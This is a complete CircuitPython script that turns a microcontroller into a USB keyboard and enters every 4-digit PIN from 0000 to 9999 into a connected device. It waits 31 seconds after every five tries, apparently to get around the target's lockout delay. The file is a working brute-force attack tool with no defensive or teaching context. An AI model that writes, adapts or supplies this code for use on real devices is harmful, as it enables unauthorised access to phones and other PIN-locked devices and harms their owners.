import time
import usb_hid
from adafruit_hid.keyboard import Keyboard
from adafruit_hid.keycode import Keycode

# Initialize the keyboard
kbd = Keyboard(usb_hid.devices)

# Keycode mapping for numbers 0-9
num = [Keycode.ZERO, Keycode.ONE, Keycode.TWO, Keycode.THREE, Keycode.FOUR,
       Keycode.FIVE, Keycode.SIX, Keycode.SEVEN, Keycode.EIGHT, Keycode.NINE]

# PIN digits
a, b, c, d = 0, 0, 0, 0
count = 0

# Wait time between attempts (in seconds)
DELAY_BETWEEN_ATTEMPTS = 1

# Function to send a 4-digit PIN
def send_pin(a, b, c, d):
    kbd.send(num[a])
    kbd.send(num[b])
    kbd.send(num[c])
    kbd.send(num[d])
    kbd.send(Keycode.ENTER)  # Press Enter

def main():
    global a, b, c, d, count

    print("Starting brute force...")
    time.sleep(3)  # Initial delay to prepare the target device

    while True:
        if count == 5:
            print("Reached 5 attempts. Waiting for 31 seconds...")
            time.sleep(31)
            count = 0

        # Send the current 4-digit PIN
        send_pin(a, b, c, d)
        print(f"Attempting PIN: {a}{b}{c}{d}")

        time.sleep(DELAY_BETWEEN_ATTEMPTS)
        count += 1

        # Increment the digits
        d += 1
        if d == 10:
            d = 0
            c += 1
            if c == 10:
                c = 0
                b += 1
                if b == 10:
                    b = 0
                    a += 1
                    if a == 10:
                        print("All combinations tried.")
                        break

if __name__ == "__main__":
    main()
